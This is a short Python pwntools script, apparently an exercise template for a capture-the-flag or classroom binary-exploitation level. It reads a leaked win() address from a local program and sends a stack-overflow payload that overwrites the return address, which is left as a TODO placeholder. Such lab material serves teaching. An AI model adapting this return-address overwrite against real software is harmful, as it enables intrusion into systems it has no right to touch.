#!/usr/bin/env python3
from pwn import *

# Uncomment this to see every single byte being sent and received:
# context.log_level = 'debug'

io = process(['./run.sh', 'level3'])

# Read win address by parsing output from the program
win_is_at = io.recvline()
print(win_is_at)

# win is at: 0x1234
win_addr = int(win_is_at.decode("UTF8").split(": ")[1], 16)
print("win() is at", hex(win_addr))

io.recvuntil(b"Enter some text: ")

buf = b''
buf += b'A' * 4 # Fill up saved frame pointer
buf += p32(0x42424242) # TODO: Overwrite return address- where do you want to go?
buf += b'\r\n'
io.sendline(buf)

# Normally, io.interactive() would be the best move here,
# however I was having issues with missing the flag being output...
# So begin cursed hacks here:
while True:
    try:
        cur_char=io.recv(1).replace(b'\r',b'')
        print(cur_char.decode(), end='')
    except UnicodeDecodeError:
        pass
